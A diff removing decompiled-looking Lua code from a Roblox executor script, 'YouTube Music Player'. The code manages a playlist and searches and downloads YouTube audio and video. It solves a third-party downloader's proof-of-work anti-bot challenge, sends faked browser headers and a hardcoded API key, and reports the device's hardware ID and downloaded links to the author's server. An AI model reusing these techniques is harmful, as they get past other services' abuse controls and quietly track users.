-				end)
-			end
-		end
-
-		local v19 = ipairs
-		local v20 = fn6(tbl12.Videos)
-
-		for _, v21 in v19(v20) do
-			local v22 = fn8(fn7(v21), ".webm")
-			tbl14.Videos[v22] = true
-
-			if not tbl13.Videos[v22] then
-				task.spawn(function()
-					local v23, v24, v25, v26 = ApiInfo(v22)
-					if not (v23 and v24 and v25) then
-						return
-					end
-					table.insert(BilbliotecaVideos, { id = v22, name = v23, author = v24, thumb = v25, authorUrl = v26 })
-					fn5(v23, "Video", v22)
-				end)
-			end
-		end
-
-		local v21 = ipairs
-		local v22 = fn6(tbl12.Roblox)
-
-		for _, v23 in v21(v22) do
-			local v24 = fn8(fn7(v23), ".rbx")
-			tbl14.Roblox[v24] = true
-
-			if not tbl13.Roblox[v24] then
-				task.spawn(function()
-					local v25, v26, v27, v28 = ApiRoblox(v24)
-					if not (v25 and v26 and v27) then
-						return
-					end
-					table.insert(BibliotecaRoblox, { id = v24, name = v25, creatorId = v26, creatorName = v27 })
-					fn5(v25, "Roblox", v24, v28)
-				end)
-			end
-		end
-
-		local v23 = ipairs
-		local v24 = fn6(tbl12.Local)
-
-		for _, v25 in v23(v24) do
-			local match = fn7(v25):match("^(.*)%.mp3$")
-			tbl14.Local[match] = true
-
-			if not tbl13.Local[match] then
-				table.insert(BibliotecaLocal, { name = match })
-				fn5(match, "Local", match)
-			end
-		end
-
-		for i = #BibliotecaMusicas, 1, -1 do
-			local v25 = BibliotecaMusicas[i]
-
-			if not tbl14.Musics[v25.id] then
-				Deletar(v25.id)
-				table.remove(BibliotecaMusicas, i)
-			end
-		end
-
-		for i = #BilbliotecaVideos, 1, -1 do
-			local v25 = BilbliotecaVideos[i]
-
-			if not tbl14.Videos[v25.id] then
-				Deletar(v25.id)
-				table.remove(BilbliotecaVideos, i)
-			end
-		end
-
-		for i = #BibliotecaRoblox, 1, -1 do
-			local v25 = BibliotecaRoblox[i]
-
-			if not tbl14.Roblox[v25.id] then
-				Deletar(v25.id)
-				table.remove(BibliotecaRoblox, i)
-			end
-		end
-
-		for i = #BibliotecaLocal, 1, -1 do
-			local v25 = BibliotecaLocal[i]
-
-			if not tbl14.Local[v25.name] then
-				Deletar(v25.name)
-				table.remove(BibliotecaLocal, i)
-			end
-		end
-	end)
-end
-
-UpdatePlaylist()
-CACHE_LINK = nil
-KEY_ATUAL = nil
-VIDEO_ATUAL = nil
-DownloadAtual = nil
-DOWNLOAD_SESSION = nil
-DOWNLOAD_TOKEN = nil
-DOWNLOAD_CLEARANCE = nil
-
-ApiSearchFree = function(arg)
-	local str6 = str3 .. "/search/youtube/free/" .. HttpService:UrlEncode(arg)
-	if not CheckRequest() then
-		return "error"
-	end
-
-	local ok3, result3 = pcall(function()
-		return game:HttpGet(str6)
-	end)
-
-	if not ok3 or not result3 then
-		return "error"
-	end
-	local v17 = string.lower(result3)
-	if string.find(v17, "too many requests") then
-		return "rate"
-	end
-
-	if string.find(v17, "no results") then
-		return "sem"
-	end
-
-	local ok4, result4 = pcall(function()
-		return HttpService:JSONDecode(result3)
-	end)
-
-	if ok4 and result4 and result4.results then
-		return result4.results
-	end
-	return "error"
-end
-
-ApiSearchPremium = function(arg, arg2, arg3, arg4, arg5, arg6, arg7)
-	local v17 = HttpService
-	local str6 = str3 .. "/search/youtube/premium/" .. tostring(arg) .. "/" .. tostring(arg2) .. "/" .. tostring(arg3) .. "/" .. tostring(arg4) .. "/" .. tostring(arg5) .. "/" .. tostring(YmpHwid()) .. "/" .. v17:UrlEncode(arg7)
-	if not CheckRequest() then
-		return "error"
-	end
-
-	local ok3, result3 = pcall(function()
-		return game:HttpGet(str6)
-	end)
-
-	if not ok3 or not result3 then
-		return "error"
-	end
-	local v18 = string.lower(result3)
-	if string.find(v18, "no results") then
-		return "sem"
-	end
-
-	if string.find(v18, "request denied") then
-		return "denied"
-	end
-
-	if string.find(v18, "too many requests") then
-		return "rate"
-	end
-
-	local ok4, result4 = pcall(function()
-		return HttpService:JSONDecode(result3)
-	end)
-
-	if ok4 and result4 and result4.results then
-		return result4.results
-	end
-	return "error"
-end
-
-DownloadLog = function(arg, arg2)
-	if not CheckRequest() then
-		return
-	end
-
-	task.spawn(function()
-		pcall(function()
-			YmpRequest({
-				Url = str3 .. "/dl",
-				Method = "POST",
-				Headers = { ["Content-Type"] = "application/json" },
-				Body = HttpService:JSONEncode({ tipo = arg2, link = arg }),
-			})
-		end)
-	end)
-end
-
-local tbl12 = {
-	1116352408,
-	1899447441,
-	3049323471,
-	3921009573,
-	961987163,
-	1508970993,
-	2453635748,
-	2870763221,
-	3624381080,
-	310598401,
-	607225278,
-	1426881987,
-	1925078388,
-	2162078206,
-	2614888103,
-	3248222580,
-	3835390401,
-	4022224774,
-	264347078,
-	604807628,
-	770255983,
-	1249150122,
-	1555081692,
-	1996064986,
-	2554220882,
-	2821834349,
-	2952996808,
-	3210313671,
-	3336571891,
-	3584528711,
-	113926993,
-	338241895,
-	666307205,
-	773529912,
-	1294757372,
-	1396182291,
-	1695183700,
-	1986661051,
-	2177026350,
-	2456956037,
-	2730485921,
-	2820302411,
-	3259730800,
-	3345764771,
-	3516065817,
-	3600352804,
-	4094571909,
-	275423344,
-	430227734,
-	506948616,
-	659060556,
-	883997877,
-	958139571,
-	1322822218,
-	1537002063,
-	1747873779,
-	1955562222,
-	2024104815,
-	2227730452,
-	2361852424,
-	2428436474,
-	2756734187,
-	3204031479,
-	3329325298,
-}
-
-local str6 = "https://p.savenow.to"
-local str7 = "https://en.loader.to/"
-local str8 = "dfcb6d76f2f6a9894gjkege8a4ab232222"
-local n4 = 200
-local n5 = 0.003
-local n6 = 30
-
-local str9 = str:gsub("^(%a+)%-(%a+)$", function(arg, arg2)
-	return arg .. "-" .. arg2:upper()
-end) .. "," .. (str:match("^(%a+)") or "en") .. ";q=0.9,en-US;q=0.8,en;q=0.7"
-
-local v17 = nil
-local n7 = 0
-local flag21 = false
-
-local function fn6(arg, arg2)
-	return bit32.rrotate(arg, arg2)
-end
-
-local function fn7(...)
-	local v18 = table.pack(...)
-	local n8 = 0
-
-	for i = 1, select("#", ...) do
-		n8 = bit32.band(n8 + select(i, table.unpack(v18, 1, v18.n)), 4294967295)
-	end
-
-	return n8
-end
-
-local function fn8(arg)
-	local n8 = #arg
-	local tbl13 = { string.byte(arg, 1, n8) }
-	local n9 = n8 * 8
-	tbl13[#tbl13 + 1] = 128
-
-	while #tbl13 % 64 ~= 56 do
-		tbl13[#tbl13 + 1] = 0
-	end
-
-	local n10 = math.floor(n9 / 4294967296)
-	local n11 = n9 % 4294967296
-
-	for i = 24, 0, -8 do
-		tbl13[#tbl13 + 1] = bit32.band(bit32.rshift(n10, i), 255)
-	end
-
-	for i = 24, 0, -8 do
-		tbl13[#tbl13 + 1] = bit32.band(bit32.rshift(n11, i), 255)
-	end
-
-	local n12 = 1779033703
-	local n13 = 3144134277
-	local n14 = 1013904242
-	local n15 = 2773480762
-	local n16 = 1359893119
-	local n17 = 2600822924
-	local n18 = 528734635
-	local n19 = 1541459225
-
-	for i = 1, #tbl13, 64 do
-		local tbl14 = {}
-
-		for i2 = 0, 15 do
-			local n20 = i + i2 * 4
-			tbl14[i2 + 1] = bit32.bor(bit32.lshift(tbl13[n20], 24), bit32.lshift(tbl13[n20 + 1], 16), bit32.lshift(tbl13[n20 + 2], 8), tbl13[n20 + 3])
-		end
-
-		for i2 = 17, 64 do
-			local v18 = tbl14[i2 - 15]
-			local v19 = tbl14[i2 - 2]
-			local rshift = bit32.rshift
-			local v20 = bit32.bxor(fn6(v18, 7), fn6(v18, 18), rshift(v18, 3))
-			local rshift2 = bit32.rshift
-			local v21 = bit32.bxor(fn6(v19, 17), fn6(v19, 19), rshift2(v19, 10))
-			tbl14[i2] = fn7(tbl14[i2 - 16], v20, tbl14[i2 - 7], v21)
-		end
-
-		local v18 = n16
-		local v19 = n17
-		local v20 = n18
-		local v21 = n19
-		local v22 = n12
-		local v23 = n13
-		local v24 = n14
-		local v25 = n15
-
-		for i2 = 1, 64 do
-			local bxor = bit32.bxor
-			local v26 = tbl12[i2]
-			local v27 = tbl14[i2]
-			local v28 = fn7(v21, bit32.bxor(fn6(v18, 6), fn6(v18, 11), fn6(v18, 25)), bxor(bit32.band(v18, v19), bit32.band(bit32.bnot(v18), v20)), v26, v27)
-			local v29 = bit32.bxor(fn6(v22, 2), fn6(v22, 13), fn6(v22, 22))
-			local band = bit32.band
-			local v30 = bit32.bxor(bit32.band(v22, v23), bit32.band(v22, v24), band(v23, v24))
-			local v31 = fn7(v29, v30)
-			local v32 = fn7(v25, v28)
-			v21 = v20
-			v25 = v24
-			v20 = v19
-			v24 = v23
-			v19 = v18
-			v23 = v22
-			v18 = v32
-			v22 = fn7(v28, v31)
-		end
-
-		n12 = fn7(n12, v22)
-		n13 = fn7(n13, v23)
-		n14 = fn7(n14, v24)
-		n15 = fn7(n15, v25)
-		n16 = fn7(n16, v18)
-		n17 = fn7(n17, v19)
-		n18 = fn7(n18, v20)
-		n19 = fn7(n19, v21)
-	end
-
-	return string.format("%08x%08x%08x%08x%08x%08x%08x%08x", n12, n13, n14, n15, n16, n17, n18, n19)
-end
-
-local function fn9(arg, arg2)
-	local num = tonumber(arg2)
-	if not num then
-		return nil
-	end
-	local str10 = string.rep("0", num)
-	local n8 = #str10
-	local str11 = tostring(arg) .. ":"
-	local n9 = 0
-
-	while true do
-		local now = os.clock()
-		local exitTo = nil
-
-		while fn8(str11 .. tostring(n9)):sub(1, n8) ~= str10 do
-			n9 += 1
-			if n5 <= os.clock() - now then
-				exitTo = 1
-				break
-			end
-		end
-
-		if exitTo == 1 then
-			task.wait()
-			continue
-		end
-		break
-	end
-
-	return tostring(n9)
-end
-
-local function fn10(arg, arg2)
-	local tbl13 = {
-		accept = "*/*",
-		["accept-language"] = str9,
-		referer = str7,
-		["sec-ch-ua"] = "\"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"",
-		["sec-ch-ua-mobile"] = "?1",
-		["sec-ch-ua-platform"] = "\"Android\"",
-		["sec-fetch-dest"] = "empty",
-		["sec-fetch-mode"] = "cors",
-		["sec-fetch-site"] = "cross-site",
-	}
-
-	if arg2 then
-		tbl13["content-type"] = "application/json"
-	end
-
-	if arg then
-		tbl13.authorization = "Bearer " .. arg
-	end
-
-	return tbl13
-end
-
-local function fn11(arg)
-	if not arg then
-		return nil
-	end
-	local body = arg.Body or arg.body
-	if type(body) ~= "string" then
-		return nil
-	end
-	local ok3, result3 = pcall(HttpService.JSONDecode, HttpService, body)
-	if not ok3 or type(result3) ~= "table" then
-		return nil
-	end
-	return result3
-end
-
-local function fn12()
-	local now = os.time()
-	if v17 and now < n7 - n6 then
-		return v17
-	end
-
-	if flag21 then
-		local now2 = os.clock()
-
-		while flag21 do
-			if not (os.clock() - now2 >= 10) then
-				task.wait()
-				continue
-			end
-			break
-		end
-
-		local now3 = os.time()
-		if v17 and now3 < n7 - n6 then
-			return v17
-		end
-	end
-
-	flag21 = true
-
-	local ok3, result3, result4 = pcall(function()
-		local v18 = YmpRequest({ Url = str6 .. "/api/pow/challenge", Method = "GET", Headers = fn10() })
-		local v19 = fn11(v18)
-		if not v19 then
-			return nil
-		end
-
-		if v19.salt == nil or v19.difficulty == nil or v19.expires_at == nil or v19.signature == nil then
-			return nil
-		end
-		local v20 = fn9(v19.salt, v19.difficulty)
-		if not v20 then
-			return nil
-		end
-
-		local v21 = YmpRequest({
-			Url = str6 .. "/api/pow/verify",
-			Method = "POST",
-			Headers = fn10(nil, true),
-			Body = HttpService:JSONEncode({
-				salt = v19.salt,
-				difficulty = v19.difficulty,
-				expires_at = v19.expires_at,
-				signature = v19.signature,
-				nonce = v20,
-			}),
-		})
-
-		local v22 = fn11(v21)
-		if not v22 or v22.success ~= true or type(v22.token) ~= "string" then
-			return nil
-		end
-		return v22.token, tonumber(v22.expires_at) or tonumber(v19.expires_at) or os.time() + 300
-	end)
-
-	flag21 = false
-	if not ok3 or type(result3) ~= "string" then
-		return nil
-	end
-	v17 = result3
-	n7 = tonumber(result4) or os.time() + 300
-	return v17
-end
-
-local function fn13(arg, arg2, arg3)
-	local now = os.clock()
-	local v18 = fn12()
-	local v19 = HttpService
-	local str10 = "&apikey=" .. str8
-	local str11 = str6 .. "/api/v2/download?format=" .. HttpService:UrlEncode(arg2) .. "&url=" .. v19:UrlEncode(arg) .. str10
-	local v20 = fn10(v18)
-
-	local ok3, result3 = pcall(function()
-		return YmpRequest({ Url = str11, Method = "GET", Headers = v20 })
-	end)
-
-	if not ok3 then
-		return "error"
-	end
-	local v21 = fn11(result3)
-	if not v21 or v21.success == false or type(v21.progress_url) ~= "string" then
-		return "error"
-	end
-	local progressUrl = v21.progress_url
-	task.wait(2)
-	local v22
-
-	while true do
-		v22 = nil
-
-		if os.clock() - now <= n4 then
-			local ok4, result4 = pcall(function()
-				return YmpRequest({ Url = progressUrl, Method = "GET", Headers = v20 })
-			end)
-
-			if ok4 then
-				local v23 = fn11(result4)
-
-				if v23 then
-					if v23.progress == 1000 and type(v23.download_url) == "string" then
-						v22 = v23
-						break
-					else
-						task.wait(2)
-					end
-				else
-					task.wait(2)
-				end
-			else
-				task.wait(2)
-			end
-		else
-			break
-		end
-	end
-
-	if not v22 then
-		return "error"
-	end
-	local tbl13 = {}
-
-	if type(v22.download_url) == "string" then
-		tbl13[#tbl13 + 1] = v22.download_url
-	end
-
-	if type(v22.alternative_download_urls) == "table" then
-		for _, alternativeDownloadUrl in ipairs(v22.alternative_download_urls) do
-			if not (#tbl13 >= 4) then
-				if type(alternativeDownloadUrl) == "table" and type(alternativeDownloadUrl.url) == "string" and alternativeDownloadUrl.url ~= v22.download_url then
-					tbl13[#tbl13 + 1] = alternativeDownloadUrl.url
-				end
-
-				continue
-			end
-
-			break
-		end
-	end
-
-	if #tbl13 == 0 then
-		return "error"
-	end
-	DownloadLog(arg, arg3)
-	local v23 = table.create(math.min(#tbl13, 4))
-
-	for i = 1, math.min(#tbl13, 4) do
-		v23[i] = "Download" .. i .. ": " .. tbl13[i]
-	end
-
-	return table.concat(v23, "\n")
-end
-
-DownloadMusic = function(arg)
-	return fn13(arg, "mp3", "music")
-end
-
-DownloadVideo = function(arg)
-	return fn13(arg, "360", "video")
-end
-
-DesativarBusca = function(arg)
-	if arg then
-		PesquisarBox.Text = Traducao.Processando
-		PesquisarBox.Active = false
-		PaginaFrame.Visible = false
-		PaginaEsperandoFrame.Visible = true
-	else
-		PesquisarBox.Text = text
-		PesquisarBox.Active = true
-		PaginaFrame.Visible = true
-		PaginaEsperandoFrame.Visible = false
-	end
-end
-
-CancelarBusca = function()
-	ScrollDownload.Visible = false
-	ScrollDownload.CanvasPosition = Vector2.new(0, 0)
-	Aguardando.Visible = true
-	DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.PesquiseTitle .. "</font>\n<font color=\"rgb(192,192,192)\">" .. Traducao.PesquiseText .. "</font>"
-	DownloadFrameTexto.Visible = true
-	Concluido.Visible = false
-	PaginaFrame.Visible = false
-	PaginaEsperandoFrame.Visible = true
-	SemResultado.Visible = false
-	Erro.Visible = false
-	Tutorial.Visible = false
-	Novamente.Visible = false
-	FiltroFrame.Visible = false
-	Formato.Visible = false
-	ScrollDownload.Visible = false
-	TextoTituloFor.Text = ""
-	Thumbfor.Image = "rbxassetid://0"
-	DownloadAtual = nil
-
-	for _, child in ipairs(ScrollDownload:GetChildren()) do
-		if child:IsA("Frame") then
-			child:Destroy()
-		end
-	end
-end
-
-Carregando = function(arg)
-	if arg then
-		flag12 = true
-		Loading.Visible = true
-		ScrollDownload.Visible = false
-		Aguardando.Visible = false
-
-		task.spawn(function()
-			while flag12 do
-				local v18 = Loading
-				v18.Rotation = v18.Rotation + 5
-				task.wait(0.04)
-			end
-		end)
-	else
-		flag12 = false
-		Loading.Visible = false
-	end
-end
-
-CarregandoRoblox = function(arg)
-	if arg then
-		if flag13 then
-			return
-		end
-		flag13 = true
-		Baixando.Visible = true
-
-		task.spawn(function()
-			while flag13 do
-				local n8 = Baixando.Rotation + 360
-				tween = v6:Create(Baixando, TweenInfo.new(0.9, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Rotation = n8 })
-				tween:Play()
-				tween.Completed:Wait()
-				local n9 = 0
-
-				while n9 < 0.35 and flag13 do
-					n9 += task.wait()
-				end
-			end
-		end)
-	else
-		flag13 = false
-
-		if tween then
-			tween:Cancel()
-			tween = nil
-		end
-
-		Baixando.Visible = false
-		Baixando.Rotation = 0
-	end
-end
-
-AddRoblox = function(arg)
-	local str10 = "YouTube Music Player/Roblox IDS" .. "/" .. tostring(arg) .. ".rbx"
-
-	pcall(function()
-		if not isfolder("YouTube Music Player/Roblox IDS") then
-			makefolder("YouTube Music Player/Roblox IDS")
-		end
-
-		writefile(str10, "")
-	end)
-
-	CancelarBusca()
-	UpdatePlaylist()
-end
-
-TelaDownload = function(arg, arg2, arg3)
-	VIDEO_ATUAL = arg
-	ScrollDownload.Visible = false
-	Formato.Visible = true
-	local str10 = "Youtube Music Player/Internal/Cache/Search_" .. tostring(arg) .. ".jpg"
-
-	if isfile and isfile(str10) then
-		Thumbfor.Image = getcustomasset(str10)
-		Thumbfor.ImageRectOffset = Vector2.new(0, 45)
-		Thumbfor.ImageRectSize = Vector2.new(480, 270)
-	else
-		Thumbfor.Image = "rbxassetid://110787075859454"
-		Thumbfor.ImageRectOffset = Vector2.new(0, 0)
-		Thumbfor.ImageRectSize = Vector2.new(0, 0)
-	end
-
-	local str11 = "Youtube Music Player/Musics/" .. tostring(arg) .. ".mp3"
-	local str12 = "Youtube Music Player/Videos/" .. tostring(arg) .. ".webm"
-	local v18 = isfile and isfile(str11)
-	local v19 = flag19 and isfile and isfile(str12)
-
-	if v18 then
-		BotaoMp3.BackgroundTransparency = 0.9
-		BotaoMp3.AutoButtonColor = false
-		NomeMp3.TextColor3 = Color3.fromRGB(20, 20, 20)
-	else
-		BotaoMp3.BackgroundTransparency = 0
-		BotaoMp3.AutoButtonColor = true
-		NomeMp3.TextColor3 = Color3.fromRGB(0, 191, 255)
-	end
-
-	if flag19 then
-		if v19 then
-			BotaoMp4.BackgroundTransparency = 0.9
-			BotaoMp4.AutoButtonColor = false
-			NomeMp4.TextColor3 = Color3.fromRGB(20, 20, 20)
-		else
-			BotaoMp4.BackgroundTransparency = 0
-			BotaoMp4.AutoButtonColor = true
-			NomeMp4.TextColor3 = Color3.fromRGB(154, 205, 50)
-		end
-	end
-
-	TextoTituloFor.Text = "<font color=\"rgb(255,255,255)\">" .. arg2 .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. arg3 .. "</font>"
-end
-
-CriarResultado = function(arg, arg2, arg3, arg4, arg5, arg6)
-	local tbl13 = {}
-	local flag22 = false
-	local str10 = "Youtube Music Player/Internal/Cache/Search_" .. arg2 .. ".jpg"
-	local frame3 = Instance.new("Frame")
-	frame3.Size = UDim2.new(0, 221, 0, 43)
-	frame3.Position = UDim2.new(0, 7, 0, 5)
-	frame3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	frame3.BorderSizePixel = 0
-	frame3.Parent = ScrollDownload
-	local imageLabel = Instance.new("ImageLabel")
-	imageLabel.Size = UDim2.new(0, 60, 0, 43)
-	imageLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	imageLabel.Parent = frame3
-	local frame4 = Instance.new("Frame")
-	frame4.Size = UDim2.new(0, 25, 0, 10)
-	frame4.Position = UDim2.new(0, 3, 0, 3)
-	frame4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-	frame4.BackgroundTransparency = 0.5
-	frame4.BorderSizePixel = 0
-	frame4.Visible = arg6 ~= nil
-	frame4.Parent = imageLabel
-	local textLabel = Instance.new("TextLabel")
-	textLabel.Size = UDim2.new(1, 0, 1, 0)
-	textLabel.BackgroundTransparency = 1
-	textLabel.Text = tostring(arg6 or "00:00")
-	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-	textLabel.Font = Enum.Font.SourceSansBold
-	textLabel.TextScaled = true
-	textLabel.Parent = frame4
-	local frame5 = Instance.new("Frame")
-	frame5.Size = UDim2.new(0, 2, 1, 0)
-	frame5.Position = UDim2.new(0, 60, 0, 0)
-	frame5.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-	frame5.BorderSizePixel = 0
-	frame5.Parent = frame3
-	local textLabel2 = Instance.new("TextLabel")
-	textLabel2.Size = UDim2.new(0, 108, 1, -6)
-	textLabel2.Position = UDim2.new(0, 65, 0, 3)
-	textLabel2.BackgroundTransparency = 1
-	textLabel2.RichText = true
-	textLabel2.Font = Enum.Font.SourceSansBold
-	textLabel2.TextScaled = true
-	textLabel2.Text = string.format("<font color=\"rgb(255,255,255)\">%s</font>\n<font color=\"rgb(192,192,192)\">%s %s</font>", arg3, Traducao.De, arg4)
-	textLabel2.Parent = frame3
-	local frame6 = Instance.new("Frame")
-	frame6.Size = UDim2.new(0, 2, 1, 0)
-	frame6.Position = UDim2.new(0, 176, 0, 0)
-	frame6.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-	frame6.BorderSizePixel = 0
-	frame6.Parent = frame3
-	local imageButton3 = Instance.new("ImageButton")
-	imageButton3.Size = UDim2.new(0, 33, 0, 33)
-	imageButton3.Position = UDim2.new(0, 183, 0, 5)
-	imageButton3.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-	imageButton3.AutoButtonColor = false
-	imageButton3.Parent = frame3
-	Corner(frame3, 5)
-	Corner(imageLabel, 5)
-	Corner(frame4, 5)
-	Corner(imageButton3, 5)
-	Stroke(frame3, 50, 50, 50, 2)
-	Stroke(imageLabel, 50, 50, 50, 2)
-	Stroke(imageButton3, 50, 50, 50, 2)
-
-	if arg == "Roblox" then
-		local str11 = tostring(arg2) .. ".rbx"
-
-		pcall(function()
-			if isfolder and isfolder("YouTube Music Player/Roblox IDS") then
-				for _, v18 in ipairs(listfiles("YouTube Music Player/Roblox IDS")) do
-					if string.find(v18, str11) then
-						flag22 = true
-						break
-					end
-				end
-			end
-		end)
-
-		imageButton3.Image = flag22 and "rbxassetid://75203635436406" or "rbxassetid://125446601626694"
-		imageLabel.Image = "rbxassetid://112075012925512"
-	else
-		imageButton3.Image = "rbxassetid://126311565377599"
-
-		task.spawn(function()
-			if not pcall(function()
-				if not isfolder("Youtube Music Player/Internal/Cache") then
-					makefolder("Youtube Music Player/Internal/Cache")
-				end
-
-				local response = game:HttpGet(arg5)
-				writefile(str10, response)
-				imageLabel.Image = getcustomasset(str10)
-				imageLabel.ImageRectOffset = Vector2.new(0, 45)
-				imageLabel.ImageRectSize = Vector2.new(480, 270)
-			end) then
-				imageLabel.Image = "rbxassetid://110787075859454"
-			end
-		end)
-	end
-
-	table.insert(tbl13, imageButton3.MouseButton1Click:Connect(function()
-		if arg == "Roblox" then
-			if not flag19 then
-				return
-			end
-
-			if flag22 then
-				fn3(Traducao.Erro, Traducao.JaTemRoblox, 5)
-			else
-				AddRoblox(arg2)
-			end
-		else
-			TelaDownload(arg2, arg3, arg4)
-		end
-	end))
-
-	frame3.Destroying:Connect(function()
-		for _, v18 in ipairs(tbl13) do
-			v18:Disconnect()
-		end
-
-		if arg ~= "Roblox" then
-			pcall(function()
-				if delfile and isfile(str10) then
-					delfile(str10)
-				end
-			end)
-		end
-	end)
-end
-
-organizarItens = function()
-	n3 = 0
-
-	for _, child in ipairs(ScrollDownload:GetChildren()) do
-		if child:IsA("Frame") then
-			child.Position = UDim2.new(0, 7, 0, n3 + 5)
-			n3 += 58
-		end
-	end
-
-	ScrollDownload.CanvasSize = UDim2.new(0, 0, 0, n3 - 3)
-end
-
-Buscar = function(arg)
-	for _, child in ipairs(ScrollDownload:GetChildren()) do
-		if child:IsA("Frame") then
-			child:Destroy()
-		end
-	end
-
-	DesativarBusca(true)
-	Carregando(true)
-	DownloadFrameTexto.Visible = false
-	FiltroFrame.Visible = false
-
-	local function fn14()
-		DesativarBusca(false)
-		Carregando(false)
-	end
-
-	local function fn15(arg2, arg3, arg4)
-		ScrollDownload.Visible = false
-
-		if arg4 then
-			SemResultado.Visible = true
-		else
-			Erro.Visible = true
-			Tutorial.Visible = true
-		end
-
-		DownloadFrameTexto.Text = string.format("<font color=\"rgb(255,255,255)\">%s</font>\n<font color=\"rgb(192,192,192)\">%s</font>", arg2, arg3)
-		DownloadFrameTexto.Visible = true
-		fn14()
-	end
-
-	if not CheckRequest() then
-		fn15(Traducao.ErroTitle, Traducao.ErroText)
-		return
-	end
-	local v18 = nil
-	local flag22 = false
-
-	task.spawn(function()
-		if flag19 then
-			v18 = ApiSearchPremium(tbl.Ordem or "relevance", tbl.Data or "any", tbl.Duracao or "any", tbl.Pagina or 1, KEY_ATUAL, YmpHwid(), arg)
-		else
-			v18 = ApiSearchFree(arg)
-		end
-
-		flag22 = true
-	end)
-
-	local now = tick()
-
-	while true do
-		task.wait(0.1)
-		if not (flag22 or tick() - now > 15) then
-			continue
-		end
-		break
-	end
-
-	if not flag22 or v18 == "error" or not v18 then
-		fn15(Traducao.ErroTitle, Traducao.ErroText)
-		return
-	end
-
-	if v18 == "denied" then
-		fn15(Traducao.ErroCrackTitle, Traducao.ErroCrackText)
-		return
-	end
-
-	if v18 == "rate" then
-		fn15(Traducao.TooMany, Traducao.RateLi)
-		return
-	end
-
-	if v18 == "sem" then
-		fn15(Traducao.SemResutadoTitle, Traducao.SemResutadoText, true)
-		return
-	end
-
-	for _, v19 in ipairs(v18) do
-		if flag19 and v19.type == "roblox" then
-			CriarResultado("Roblox", v19.id, v19.Name, v19.CreatorName, nil, nil)
-		else
-			CriarResultado("YouTube", v19.id, v19.name, v19.author, v19.thumbnail, v19.duration)
-		end
-	end
-
-	fn14()
-	ScrollDownload.Visible = true
-end
-
-SetPag = function(pagina)
-	if not flag19 then
-		return
-	end
-
-	if tbl.Pagina == pagina then
-		return
-	end
-	tbl.Pagina = pagina
-	ScrollDownload.CanvasPosition = Vector2.new(0, 0)
-
-	for _, child in ipairs(ScrollPagina:GetChildren()) do
-		if child:IsA("ImageButton") then
-			local uiStroke = child:FindFirstChildOfClass("UIStroke")
-
-			if child.Name == tostring(pagina) then
-				child.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
-
-				if uiStroke then
-					uiStroke.Color = Color3.fromRGB(255, 0, 0)
-				end
-			else
-				child.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-
-				if uiStroke then
-					uiStroke.Color = Color3.fromRGB(50, 50, 50)
-				end
-			end
-		end
-	end
-end
-
-Baixar = function(arg)
-	Formato.Visible = false
-	FiltroFrame.Visible = false
-	Erro.Visible = false
-	Tutorial.Visible = false
-	Novamente.Visible = false
-	DesativarBusca(true)
-	CarregandoRoblox(true)
-	DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.Aguarde .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.Dados .. "</font>"
-	DownloadFrameTexto.Visible = true
-	local v18 = VIDEO_ATUAL
-	local str10 = "https://youtu.be/" .. tostring(v18)
-
-	local function fn14(arg2)
-		if type(arg2) ~= "string" then
-			return nil
-		end
-		local tbl13 = {}
-
-		for match in string.gmatch(arg2, "[^\n]+") do
-			local v19, v20 = string.match(match, "Download(%d+):%s*(.+)")
-
-			if v19 and v20 then
-				tbl13[tonumber(v19)] = v20
-			end
-		end
-
-		return tbl13
-	end
-
-	local v19
-
-	if arg == "Musica" then
-		v19 = DownloadMusic(str10)
-	else
-		v19 = nil
-
-		if arg == "Video" then
-			v19 = DownloadVideo(str10)
-		end
-	end
-
-	if v19 == "error" or v19 == "rate" or v19 == "denied" or not CheckRequest() then
-		CarregandoRoblox(false)
-		DesativarBusca(false)
-		Erro.Visible = true
-		Tutorial.Visible = true
-		Novamente.Visible = true
-
-		if not frame.Visible or not Tela4.Visible then
-			fn3(Traducao.ErroTitle, Traducao.ErroText, 10)
-		end
-
-		DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.ErroTitle .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.ErroText .. "</font>"
-		return
-	end
-
-	local v20 = fn14(v19)
-
-	if not v20 then
-		CarregandoRoblox(false)
-		DesativarBusca(false)
-		Erro.Visible = true
-		Tutorial.Visible = true
-		Novamente.Visible = true
-
-		if not frame.Visible or not Tela4.Visible then
-			fn3(Traducao.ErroTitle, Traducao.ErroText, 10)
-		end
-
-		DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.ErroTitle .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.ErroText .. "</font>"
-		return
-	end
-
-	DownloadFrameTexto.Text = "<font color=\"rgb(255,255,255)\">" .. Traducao.MaisUmPauco .. "</font>\n" .. "<font color=\"rgb(192,192,192)\">" .. Traducao.Baixando .. "</font>"
-	local v21 = nil
-
-	for i = 1, 4 do
-		local v22 = v20[i]
-
-		if v22 and type(v22) == "string" then
-			for i2 = 1, 2 do
-				local ok3, result3 = pcall(function()
-					return game:HttpGet(v22)
-				end)
-
-				if ok3 and result3 then
-					v21 = result3
-					break
-				else
-					task.wait(0.5)
-				end
-			end
-
-			if not v21 then
-				continue
-			end
-		else
-			continue
-		end
-
-		break
-	end
-
-	if not v21 then
-		CarregandoRoblox(false)
-		DesativarBusca(false)
-		Erro.Visible = true
-		Tutorial.Visible = true
-		Novamente.Visible = true
-
-		if not frame.Visible or not Tela4.Visible then
-			fn3(Traducao.ErroTitle, Traducao.ErroText, 10)
-		end
-
